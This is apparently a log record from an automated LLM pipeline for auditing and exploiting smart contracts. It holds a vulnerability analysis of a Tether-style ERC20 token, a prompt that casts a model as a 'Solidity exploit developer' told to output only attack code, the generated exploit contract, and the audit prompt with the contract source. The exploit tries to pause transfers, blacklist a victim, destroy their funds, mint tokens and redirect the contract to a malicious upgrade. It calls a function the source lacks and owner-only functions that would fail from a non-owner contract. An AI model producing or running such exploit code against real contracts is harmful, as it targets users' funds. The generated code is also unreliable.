can be deprecated and forward calls to an upgraded contract address.  \n- The forwarding calls rely on the upgraded contract implementing the expected interface.  \n- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  \n- This is a **trust risk** and potential for upgrade abuse or phishing.\n\n**D. Approve Race Condition Mitigation**  \n- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  \n- This is good practice and not a vulnerability.\n\n**E. No Reentrancy or Ether Handling**  \n- The contract does not hold or handle ETH; no payable functions or fallback.  \n- No reentrancy risk.\n\n**F. Arithmetic Safety**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.\n\n**H. Pausable Mechanism**  \n- Owner can pause all token transfers, freezing user operations.  \n- This is a centralized control feature, not a vulnerability per se but a risk.\n\n3. Exploitation Requirements:  \n\n- **Owner Key Compromise:** If the private key of the owner is compromised, attacker can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist any user and destroy their tokens, confiscating funds.  \n  - Mint unlimited tokens to themselves, diluting value.  \n  - Redeem tokens from owner balance arbitrarily.  \n  - Set fees arbitrarily (up to limits) to drain user transfers.  \n  - Deprecate contract and redirect users to malicious upgraded contract.  \n\n- **Malicious Owner:** If the owner is malicious or acts maliciously, they can perform all above actions arbitrarily.\n\n- **Upgrade Abuse:** Owner can set upgradedAddress to a malicious contract that steals tokens or behaves maliciously.\n\n- **No user setup required** to exploit these vulnerabilities beyond owner control.\n\n---\n\n**Summary:**  \nThe contract is a classic Tether-like ERC20 token with centralized admin controls. The main vulnerabilities are **centralization risks**: owner can freeze transfers, blacklist and confiscate tokens, mint new tokens arbitrarily, and upgrade to malicious contracts. There are no technical bugs like reentrancy or arithmetic errors, but the **owner‚Äôs extensive powers represent a significant economic and permission risk**. Users must trust the owner not to abuse these powers.\n\n---\n\n**Solidity Version:**  \n`pragma solidity ^0.4.17;`', 'contract_analysis': 'The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features: pausable transfers, blacklisting, token issuance and redemption by the owner, and upgradeability (deprecate and forward calls to a new contract). It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds user token balances and can hold user funds in the form of tokens.\n\nKey features and components:  \n- **Pausable:** Owner can pause/unpause token transfers globally.  \n- **BlackList:** Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted users‚Äô token balances (burn tokens).  \n- **Upgradeability:** Owner can deprecate this contract and forward calls to an upgraded contract.  \n- **Fees:** There is a basisPointsRate and maximumFee mechanism for charging fees on transfers, but currently set to zero.  \n- **Token issuance and redemption:** Owner can mint new tokens or redeem (burn) tokens from their own balance.  \n- **ERC20 standard compliance:** Implements transfer, transferFrom, approve, allowance, balanceOf, totalSupply.  \n- Solidity version pragma: `pragma solidity ^0.4.17;`\n\n2.', 'vulnerability_assessment': '**A. Centralization / Owner Power Risks**  \n- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  \n- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  \n- This is a **backdoor to confiscate tokens** from any user arbitrarily.  \n- No user consent or on-chain governance is required.  \n- This can be abused maliciously or if the owner key is compromised.\n\n**C. Upgradeability and Deprecated Contract Forwarding**  \n- The contract can be deprecated and forward calls to an upgraded contract address.  \n- The forwarding calls rely on the upgraded contract implementing the expected interface.  \n- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  \n- This is a **trust risk** and potential for upgrade abuse or phishing.\n\n**D. Approve Race Condition Mitigation**  \n- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  \n- This is good practice and not a vulnerability.\n\n**E. No Reentrancy or Ether Handling**  \n- The contract does not hold or handle ETH; no payable functions or fallback.  \n- No reentrancy risk.\n\n**F. Arithmetic Safety**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.\n\n**H. Pausable Mechanism**  \n- Owner can pause all token transfers, freezing user operations.  \n- This is a centralized control feature, not a vulnerability per se but a risk.\n\n3.', 'exploitation_requirements': '- **Owner Key Compromise:** If the private key of the owner is compromised, attacker can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist any user and destroy their tokens, confiscating funds.  \n  - Mint unlimited tokens to themselves, diluting value.  \n  - Redeem tokens from owner balance arbitrarily.  \n  - Set fees arbitrarily (up to limits) to drain user transfers.  \n  - Deprecate contract and redirect users to malicious upgraded contract.  \n\n- **Malicious Owner:** If the owner is malicious or acts maliciously, they can perform all above actions arbitrarily.\n\n- **Upgrade Abuse:** Owner can set upgradedAddress to a malicious contract that steals tokens or behaves maliciously.\n\n- **No user setup required** to exploit these vulnerabilities beyond owner control.', 'analysis_duration': 21.754350185394287}, 'attack': {'attack_prompt': "\nYou are a Solidity exploit developer. Based on the security analysis, create ONLY executable Solidity attack code.\n\nSecurity Analysis:\n\nContract Analysis: The analyzed contract is **TetherToken**, an ERC20 token implementation with additional features: pausable transfers, blacklisting, token issuance and redemption by the owner, and upgradeability (deprecate and forward calls to a new contract). It inherits from `Pausable`, `StandardToken`, and `BlackList`. The contract holds user token balances and can hold user funds in the form of tokens.\n\nKey features and components:  \n- **Pausable:** Owner can pause/unpause token transfers globally.  \n- **BlackList:** Owner can blacklist addresses, preventing them from transferring tokens and can destroy blacklisted users‚Äô token balances (burn tokens).  \n- **Upgradeability:** Owner can deprecate this contract and forward calls to an upgraded contract.  \n- **Fees:** There is a basisPointsRate and maximumFee mechanism for charging fees on transfers, but currently set to zero.  \n- **Token issuance and redemption:** Owner can mint new tokens or redeem (burn) tokens from their own balance.  \n- **ERC20 standard compliance:** Implements transfer, transferFrom, approve, allowance, balanceOf, totalSupply.  \n- Solidity version pragma: `pragma solidity ^0.4.17;`\n\n2.\n\nVulnerability Assessment: **A. Centralization / Owner Power Risks**  \n- The owner has **extensive control**: can pause/unpause transfers, blacklist any user, destroy blacklisted users‚Äô tokens, issue new tokens (mint), redeem tokens (burn from owner), set fees, and upgrade the contract.  \n- This centralization means the owner can effectively freeze user funds, confiscate tokens from blacklisted users, and inflate the token supply arbitrarily. This is a **trust and censorship risk**, not a technical bug but a critical economic and permission risk.\n\n**B. Blacklist and Destroy Black Funds**  \n- The owner can blacklist any user and then call `destroyBlackFunds` to zero out their balance and reduce total supply accordingly.  \n- This is a **backdoor to confiscate tokens** from any user arbitrarily.  \n- No user consent or on-chain governance is required.  \n- This can be abused maliciously or if the owner key is compromised.\n\n**C. Upgradeability and Deprecated Contract Forwarding**  \n- The contract can be deprecated and forward calls to an upgraded contract address.  \n- The forwarding calls rely on the upgraded contract implementing the expected interface.  \n- If the owner sets an arbitrary upgraded address, users‚Äô tokens and balances could be redirected to a malicious contract.  \n- This is a **trust risk** and potential for upgrade abuse or phishing.\n\n**D. Approve Race Condition Mitigation**  \n- The `approve` function requires that if the new allowance is non-zero, the current allowance must be zero. This mitigates the known ERC20 race condition.  \n- This is good practice and not a vulnerability.\n\n**E. No Reentrancy or Ether Handling**  \n- The contract does not hold or handle ETH; no payable functions or fallback.  \n- No reentrancy risk.\n\n**F. Arithmetic Safety**  \n- Uses SafeMath for all arithmetic operations, preventing overflows/underflows.\n\n**G. Short Address Attack Mitigation**  \n- Uses `onlyPayloadSize` modifier to prevent short address attack on transfer, transferFrom, and approve.\n\n**H. Pausable Mechanism**  \n- Owner can pause all token transfers, freezing user operations.  \n- This is a centralized control feature, not a vulnerability per se but a risk.\n\n3.\n\nExploitation Requirements: - **Owner Key Compromise:** If the private key of the owner is compromised, attacker can:  \n  - Pause the contract, freezing all transfers.  \n  - Blacklist any user and destroy their tokens, confiscating funds.  \n  - Mint unlimited tokens to themselves, diluting value.  \n  - Redeem tokens from owner balance arbitrarily.  \n  - Set fees arbitrarily (up to limits) to drain user transfers.  \n  - Deprecate contract and redirect users to malicious upgraded contract.  \n\n- **Malicious Owner:** If the owner is malicious or acts maliciously, they can perform all above actions arbitrarily.\n\n- **Upgrade Abuse:** Owner can set upgradedAddress to a malicious contract that steals tokens or behaves maliciously.\n\n- **No user setup required** to exploit these vulnerabilities beyond owner control.\n\n\nTarget Contract Address: 0xC89Ce4735882C9F0f0FE26686c53074E09B0D550\n\nRequirements:\n- Generate ONLY complete, compilable Solidity code\n- Include pragma solidity version \n- Create a contract that can be deployed and executed\n- Ensure to use the same solidity version as the target contract and respect the syntax rules for this version\n- Include an attack function (named 'attack', 'exploit', or 'run')\n- The constructor should take the target contract address as parameter\n- Focus on exploiting the identified vulnerabilities\n- NO explanations, NO comments, ONLY CODE\nReturn format: Pure Solidity code in ```solidity code blocks.\n```pragma solidity 0.4.17\n", 'attack_raw_response': '```solidity\npragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint256 amount) external;\n    function redeem(uint256 amount) external;\n    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address maliciousUpgraded) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.redeem(500000 ether);\n        target.setParams(100, 1000);\n        target.deprecate(maliciousUpgraded);\n    }\n}\n```', 'code': 'pragma solidity 0.4.17;\n\ninterface ITetherToken {\n    function pause() external;\n    function blacklist(address _evilUser) external;\n    function destroyBlackFunds(address _blackListedUser) external;\n    function issue(uint256 amount) external;\n    function redeem(uint256 amount) external;\n    function setParams(uint256 newBasisPoints, uint256 newMaxFee) external;\n    function deprecate(address _upgradedAddress) external;\n}\n\ncontract TetherTokenExploit {\n    ITetherToken public target;\n\n    function TetherTokenExploit(address _target) public {\n        target = ITetherToken(_target);\n    }\n\n    function attack(address victim, address maliciousUpgraded) public {\n        target.pause();\n        target.blacklist(victim);\n        target.destroyBlackFunds(victim);\n        target.issue(1000000 ether);\n        target.redeem(500000 ether);\n        target.setParams(100, 1000);\n        target.deprecate(maliciousUpgraded);\n    }\n}', 'code_type': 'solidity', 'attack_duration': 5.039640426635742}, 'prompt': '\nYou are a world-class smart contract security auditor.\n\n**Ignore all contracts that are standard utilities (ERC20, SafeMath, Ownable, Math, Interface, Libraries, etc). Focus only on contracts that can hold ETH or user funds, or have business logic.**\n\nYour task is to analyze the contracts and identify vulnerabilities:\n- Analyze only the real targets (wallets, banks, DAOs, exchanges, casinos, crowdsales, games, proxies, funds, staking, etc.)\n- Identify **any vulnerability**: reentrancy, logic bugs, permission issues, math errors, unsafe calls, backdoors, economic exploits, etc.\n- Explain the vulnerability mechanism and potential impact\n- If an initial setup is required for exploitation, describe the setup process\n- Return the solidity version of the contracts (pragma solidity ^x.x.x)\n\nThe slither analyze :  \n\nContracts context (JSON):\n{\n  "filename": "tmppqva0qgb.sol",\n  "contracts": [\n    {\n      "contract_name": "Ownable",\n      "address": "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550",\n      "abi": [\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        }\n      ],\n      "functions": [\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [],\n      "accounts_balances": {\n        "0xC89Ce4735882C9F0f0FE26686c53074E09B0D550": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transferFrom(address _from, address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[_from]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferFromByLegacy(msg.sender, _from, _to, _value);\\n        } else {\\n            return super.transferFrom(_from, _to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function balanceOf(address who) public constant returns (uint) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).balanceOf(who);\\n        } else {\\n            return super.balanceOf(who);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).approveByLegacy(msg.sender, _spender, _value);\\n        } else {\\n            return super.approve(_spender, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).allowance(_owner, _spender);\\n        } else {\\n            return super.allowance(_owner, _spender);\\n        }\\n    }\\n\\n    // deprecate current contract in favour of a new one\\n    function deprecate(address _upgradedAddress) public onlyOwner {\\n        deprecated = true;\\n        upgradedAddress = _upgradedAddress;\\n        Deprecate(_upgradedAddress);\\n    }\\n\\n    // deprecate current contract if favour of a new one\\n    function totalSupply() public constant returns (uint) {\\n        if (deprecated) {\\n            return StandardToken(upgradedAddress).totalSupply();\\n        } else {\\n            return _totalSupply;\\n        }\\n    }\\n\\n    // Issue a new amount of tokens\\n    // these tokens are deposited into the owner address\\n    //\\n    // @param _amount Number of tokens to be issued\\n    function issue(uint amount) public onlyOwner {\\n        require(_totalSupply + amount > _totalSupply);\\n        require(balances[owner] + amount > balances[owner]);\\n\\n        balances[owner] += amount;\\n        _totalSupply += amount;\\n        Issue(amount);\\n    }\\n\\n    // Redeem tokens.\\n    // These tokens are withdrawn from the owner address\\n    // if the balance must be enough to cover the redeem\\n    // or the call will fail.\\n    // @param _amount Number of tokens to be issued\\n    function redeem(uint amount) public onlyOwner {\\n        require(_totalSupply >= amount);\\n        require(balances[owner] >= amount);\\n\\n        _totalSupply -= amount;\\n        balances[owner] -= amount;\\n        Redeem(amount);\\n    }\\n\\n    function setParams(uint newBasisPoints, uint newMaxFee) public onlyOwner {\\n        // Ensure transparency by hardcoding limit beyond which fees can never be added\\n        require(newBasisPoints < 20);\\n        require(newMaxFee < 50);\\n\\n        basisPointsRate = newBasisPoints;\\n        maximumFee = newMaxFee.mul(10**decimals);\\n\\n        Params(basisPointsRate, maximumFee);\\n    }\\n\\n    // Called when new token are issued\\n    event Issue(uint amount);\\n\\n    // Called when tokens are redeemed\\n    event Redeem(uint amount);\\n\\n    // Called when contract is deprecated\\n    event Deprecate(address newAddress);\\n\\n    // Called if contract ever adds fees\\n    event Params(uint feeBasisPoints, uint maxFee);\\n}",\n      "solc_version": "0.4.17"\n    },\n    {\n      "contract_name": "Pausable",\n      "address": "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb",\n      "abi": [\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "unpause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "paused",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [],\n          "name": "pause",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xD833215cBcc3f914bD1C9ece3EE7BF8B14f841bb": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "paused": false,\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1"\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 